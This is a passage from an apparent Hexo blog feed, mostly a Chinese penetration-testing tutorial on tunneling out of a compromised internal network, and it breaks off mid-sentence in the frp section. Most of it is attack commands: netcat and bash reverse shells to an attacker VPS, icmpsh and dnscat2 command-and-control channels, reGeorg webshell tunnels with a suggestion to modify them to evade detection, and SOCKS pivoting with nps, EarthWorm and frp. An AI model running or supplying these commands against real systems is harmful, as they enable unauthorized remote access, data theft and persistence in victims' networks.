href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-知识-内网隧道技术小结</title>
      <link href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#0x00__3">0x00 内网穿透技术</a></li><li><a href="#0x01__23">0x01 首先判断出网协议</a></li><li><a href="#0x02__55">0x02 各种协议隧道</a></li><li><a href="#_59">网络层</a></li><li><ul><li><a href="#ICMP_61">ICMP隧道</a></li><li><a href="#Lcx_113">Lcx</a></li></ul></li><li><a href="#_131">传输层</a></li><li><ul><li><a href="#nc_133">瑞士军刀：nc</a></li><li><a href="#Powercatpowershellnc_199">Powercat（powershell版的nc）</a></li><li><a href="#netshwindow_239">推荐：netsh端口转发（window平台）</a></li></ul></li><li><a href="#_269">应用层</a></li><li><ul><li><a href="#SSH_271">SSH转发：</a></li><li><a href="#SSH__281">SSH 本地转发机制：</a></li><li><a href="#SSH__325">SSH 远程转发机制：</a></li><li><a href="#SSH__351">SSH 动态转发机制：</a></li><li><a href="#HTTP_HTTPS_370">HTTP HTTPS协议隧道</a></li><li><a href="#DNS__422">DNS 隧道：</a></li><li><a href="#Socks_487">Socks代理：</a></li><li><a href="#_499">推荐使用</a></li><li><a href="#Nps_501">Nps</a></li><li><a href="#ew_595">ew</a></li><li><a href="#Frp_639">Frp</a></li><li><a href="#Venom_698">Venom</a></li></ul></li><li><a href="#0x03__757">0x03 总结</a></li></ul><h1 id="0x00-内网穿透技术"><a href="#0x00-内网穿透技术" class="headerlink" title="0x00 内网穿透技术"></a>0x00 内网穿透技术</h1><p>当我们拿到一台内网主机后，一般都是有区域隔离的。</p><p>所以内网隧道技术，就是我们必须要掌握的。</p><p>我简单介绍一下建立通信隧道，常见的有端口转发等</p><p>主要隧道有：</p><p>ICMP TCP UDP</p><p>SSH HTTP DNS</p><p>SOCKS</p><h1 id="0x01-首先判断出网协议"><a href="#0x01-首先判断出网协议" class="headerlink" title="0x01 首先判断出网协议"></a>0x01 首先判断出网协议</h1><p>icmp协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 命令</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p>TCP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">nc IP</span><br></pre></td></tr></table></figure><p>HTTP协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ip:port</span><br><span class="line">curl www.baidu.com:80</span><br></pre></td></tr></table></figure><p>DNS协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nslookup www.baidu.com</span><br><span class="line">Dig www.baidu.com</span><br></pre></td></tr></table></figure><h1 id="0x02-各种协议隧道"><a href="#0x02-各种协议隧道" class="headerlink" title="0x02 各种协议隧道"></a>0x02 各种协议隧道</h1><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p><p>icmp隧道常用攻击：icmpsh、PRISM</p><p>icmpsh<br>环境说明:跨平台、不需要管理员运行</p><p>有三台机器： VPS–边界机–内网机</p><p>VPS操作过程：</p><p>下载icmpsh</p><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">服务端禁用：</span><br><span class="line">icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line"></span><br><span class="line">运行程序 ：</span><br><span class="line">.&#x2F;run.sh</span><br><span class="line"></span><br><span class="line">输入目标主机IP地址 开启监听：</span><br><span class="line">.&#x2F;icmpsh_m,py  vpsip 边界出网的公网IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在边界机执行：</span><br><span class="line">Imp.exe -t 攻击机ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p>还有一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编译 gcc icmpsh-m.c</span><br><span class="line"></span><br><span class="line">VPS开启监听： sudo .&#x2F;a.out</span><br><span class="line"></span><br><span class="line">内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><h2 id="Lcx"><a href="#Lcx" class="headerlink" title="Lcx"></a>Lcx</h2><p>内网端口转发</p><p>老工具了也是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">目标主机：</span><br><span class="line"></span><br><span class="line">lcx.exe -slave vpsip 4444 127.0.0.1 3389</span><br><span class="line"></span><br><span class="line">VPS:</span><br><span class="line"></span><br><span class="line">Lcx --listen 4444 5555</span><br></pre></td></tr></table></figure><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="瑞士军刀：nc"><a href="#瑞士军刀：nc" class="headerlink" title="瑞士军刀：nc"></a>瑞士军刀：nc</h2><p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p><p>简单互相传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 </span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip 5555</span><br></pre></td></tr></table></figure><p>文件传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 &gt;1.txt</span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip &lt; xx.txt</span><br></pre></td></tr></table></figure><p>shell的反弹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">nc  192.168.1.1 4444</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">nc 192.168.1.1 4444 -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>注意：windows版本CMD位置</p><p>C:\windows\system32\cmd.exe</p><p>Bash反向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">Bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="Powercat（powershell版的nc）"><a href="#Powercat（powershell版的nc）" class="headerlink" title="Powercat（powershell版的nc）"></a>Powercat（powershell版的nc）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正向和反向连接：</span><br><span class="line"></span><br><span class="line">powercat -l -p 8080 -e cmd.exe  -v   </span><br><span class="line">nc 192.168.1.1 8080 -vv</span><br><span class="line"></span><br><span class="line">nc -l -p 8080 -vv</span><br><span class="line">powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v</span><br></pre></td></tr></table></figure><p>可以反弹powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-eq</span><br></pre></td></tr></table></figure><p><strong>文件上传</strong></p><p>这个不用说，基本这种连接的都支持</p><p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p><p>在有<code>text.txt</code>的机器执行:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v</span><br></pre></td></tr></table></figure><p>另一台机器执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -of c:test.txt -v</span><br></pre></td></tr></table></figure><h2 id="推荐：netsh端口转发（window平台）"><a href="#推荐：netsh端口转发（window平台）" class="headerlink" title="推荐：netsh端口转发（window平台）"></a>推荐：netsh端口转发（window平台）</h2><p>netsh仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看系统防火墙状态</span><br><span class="line">netsh firewall show state   </span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all   </span><br><span class="line"></span><br><span class="line">添加转发规则</span><br><span class="line">listenaddress – 等待连接的本地IP地址</span><br><span class="line">listenport – 本地侦听TCP端口</span><br><span class="line">connectaddress – 将传入连接重定向到本地或远程IP地址（或DNS名称）</span><br><span class="line"></span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;边界机 listenport&#x3D;6666 connectaddress&#x3D;内网IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#连接边界机6666端口，就是连接到内网目标上面的3389</span><br><span class="line"></span><br><span class="line">使用netstat确保6666端口当前处于被侦听状态：</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br></pre></td></tr></table></figure><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="SSH转发："><a href="#SSH转发：" class="headerlink" title="SSH转发："></a>SSH转发：</h2><p>一个正常的SSH命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="SSH-本地转发机制："><a href="#SSH-本地转发机制：" class="headerlink" title="SSH 本地转发机制："></a>SSH 本地转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB双网卡192.168.1.1和10.1.1.1段</p><p>本地转发机制：</p><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台启用</span><br><span class="line">-N 不打开远程shell，处于等待状态</span><br><span class="line">-g 允许本地转发端口</span><br></pre></td></tr></table></figure><p>使用方法：</p><p><strong>在VPS上运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH 边界机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#VPS检查---查看端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;5555&quot;</span><br></pre></td></tr></table></figure><p>当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机</p><h2 id="SSH-远程转发机制："><a href="#SSH-远程转发机制：" class="headerlink" title="SSH 远程转发机制："></a>SSH 远程转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB—-目标主机—都是单网卡，都是纯内网 10.1.1.1段</p><p><strong>在WEB边界机运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102</span><br></pre></td></tr></table></figure><p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p><h2 id="SSH-动态转发机制："><a href="#SSH-动态转发机制：" class="headerlink" title="SSH 动态转发机制："></a>SSH 动态转发机制：</h2><p>这里主要是建立一个动态的socks代理隧道</p><p>在VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;</span><br><span class="line">ssh -CfNg -D 7000 root@192.168.1.1</span><br></pre></td></tr></table></figure><p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p><h2 id="HTTP-HTTPS协议隧道"><a href="#HTTP-HTTPS协议隧道" class="headerlink" title="HTTP HTTPS协议隧道"></a>HTTP HTTPS协议隧道</h2><ol><li>reGeorg：</li></ol><p>将对应的脚本文件上传到目标服务器，根据不同的网站类型php jsp asp等，上传对应的脚本 reGeorg.php</p><p>攻击机(VPS)运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 46.46.46.46（VPS的IP） -p 666（VPS端口） -u http:&#x2F;&#x2F;（目标服务器IP）&#x2F;reGeorg.php</span><br></pre></td></tr></table></figure><p>然后在本地通过代理工具链接本地的666，就是链接好隧道了</p><p>注意：这个查杀比较严重，建议会免杀的修改修改。</p><p>非常遗憾的是，目前大部分<code>WAF</code>都会针对默认原装版本的<code>reGeorg</code> 。（可以自己修改后使用）</p><p>2.Neo-reGeorg</p><p>这里推荐用 Neo-reGeorg 这个也不错，是重构reGeorg 的一个作品</p><p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p><p>用法类似：</p><p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br></pre></td></tr></table></figure><p>将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。</p><p>VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080（本地代理地址）</span><br></pre></td></tr></table></figure><p>Socks连接工具连接本地127.0.0.1:1080</p><h2 id="DNS-隧道："><a href="#DNS-隧道：" class="headerlink" title="DNS 隧道："></a>DNS 隧道：</h2><p>dnscat2</p><p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p><p>dnscat2分为两个部分：客户端和服务器。</p><p>服务端为<code>Ruby</code>编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：</p><p>服务端VPS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装依赖：</span><br><span class="line">apt install gem</span><br><span class="line">apt install ruby-dev</span><br><span class="line">apt install libpq-dev</span><br><span class="line">apt install ruby-bundler</span><br><span class="line"></span><br><span class="line">下载并安装：</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server</span><br><span class="line">sudo gem install bundler</span><br><span class="line"></span><br><span class="line">开启服务：</span><br><span class="line">ruby .&#x2F;dnscat2.rb vpn.zeo.com -e open</span><br></pre></td></tr></table></figure><p>目标主机客户端：</p><p>上传dnsClient.zip 到目标主机 解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dnscat --dns server&#x3D;服务端ip,port&#x3D;53 --secret&#x3D;服务端生成的秘钥</span><br></pre></td></tr></table></figure><p>直连模式使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS中 server路径下：</span><br><span class="line">ruby .&#x2F;dnscat2</span><br><span class="line"></span><br><span class="line">客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）</span><br><span class="line">.&#x2F;dnscat --dns server&#x3D;x.x.x.x,port&#x3D;53 --secret&#x3D;281fc7a7ec57d500d269c96b8ae36ba5</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用命令： </span><br><span class="line">window -i 1 进入交互 </span><br><span class="line">exec -c &quot;ping baidu.com&quot; 执行命令， 无回显 </span><br><span class="line">shell 返回一个半交互shell,会有一个id，记录此id </span><br><span class="line">ctrl+Z 返回</span><br></pre></td></tr></table></figure><h2 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a>Socks代理：</h2><p>下面基本上都是可以支持多种协议，之介绍scoks的情况，大家可以自己查看使用方法</p><p>也推荐使用这些工具</p><p><strong>nps：</strong> <a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a></p><p>**ew：**<a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p><p><strong>frp：</strong> <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h2 id="推荐使用"><a href="#推荐使用" class="headerlink" title="推荐使用"></a>推荐使用</h2><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。</p><p>(<a href="https://github.com/ehang-io/nps\" target="_blank" rel="noopener">https://github.com/ehang-io/nps\</a>)</p><p>优点：</p><ul><li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li><li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li><li>操作简单，只需简单的配置即可在web ui上完成其余操作</li><li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li><li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li></ul><p>环境说明:</p><p>kali边界机: 192.168.5.123 192.168.3.2<br>kali2: 192.168.5.128 攻击者vps机器<br>win7:192.168.3.99 内网机器</p><p>1 启动服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;conf&#x2F;nps.conf</span><br><span class="line">cd ..</span><br><span class="line">.&#x2F;nps. #启动服务</span><br></pre></td></tr></table></figure><p>在服务端配置conf/nps.conf文件，修改用户名密码，端口号后启动服务,最好不要和已有的端口冲突</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">以上都可以在服务端配置conf&#x2F;nps.conf 自行修改</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104408292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>直接访问自己设计的web端口 <a href="http://IP:8081/login/index" target="_blank" rel="noopener">http://IP:8081/login/index</a></p><p>友好的操作界面！</p><p><img src="https://img-blog.csdnimg.cn/20200506104440491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 新增一个客户端，在配置中填写socks代理的密码</p><p><img src="https://img-blog.csdnimg.cn/20200506104524136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3 记住唯一验证密钥和ID，连接使用</p><p><img src="https://img-blog.csdnimg.cn/20200506104547485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4 客户端连接，上传npc到边界机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server&#x3D;服务端ip:8024 -vkey&#x3D;生成的vkey -type&#x3D;tcp</span><br></pre></td></tr></table></figure><p>成功上线，点击隧道配置代理</p><p><img src="https://img-blog.csdnimg.cn/20200506104606195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>新建隧道，协议很全</p><p><img src="https://img-blog.csdnimg.cn/20200506104619902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[(img-KVfWBLv0-1588732919232)(/Users/zy/Documents/文档文件/学习笔记/内网/内网隧道技术.assets/image-20200430111407478.png)]"><br>这个界面十分友好，就不继续介绍，基本看一眼就会用了。</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，可以用于多层的内网穿透</p><p>多层内网穿透可以去GitHub查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS开启监听：</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024</span><br><span class="line"></span><br><span class="line">边界机执行：</span><br><span class="line">ew_for_Win.exe -s rssocks -d 攻击Ip -e 1024</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104758900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>多层内网二层网络，A无外网 IP–vps 流量转发 +B 正向代理 +A作为跳板端口绑定</p><p>VPS–边界机（可以出网）–内网机（目标网络内部主机，无法访问公网）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS:</span><br><span class="line">.&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">边界机器:</span><br><span class="line">ew -s lcx_slave -d VPS_IP -e 666 -f 内网主机 -g 9999</span><br><span class="line">内网:</span><br><span class="line">ew -s sscoksd -l 9999</span><br></pre></td></tr></table></figure><p>VPS将1080的代理请求转发到8888</p><p>在边界机上，通过工具的 lcx_slave 方式，打通VPS:8888 和 内网机:9999 之间的通讯隧道</p><p>在内网主机上利用 ssocksd 方式启动 9999 代理</p><p>我们是可通过访问VPS:1080 来使用内网主机提供的 socks5 代理</p><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><ul><li>frp 是一个可用于内网穿透的高性能的反向代理应用</li><li>支持 tcp, udp 协议，为 http 和 https</li></ul><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><p>首先在vps上启动frp服务端,开启一个端口，默认是7000：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>再配置frp的客户端：</p><ol><li>修改 frpc.ini 文件，假设 frps 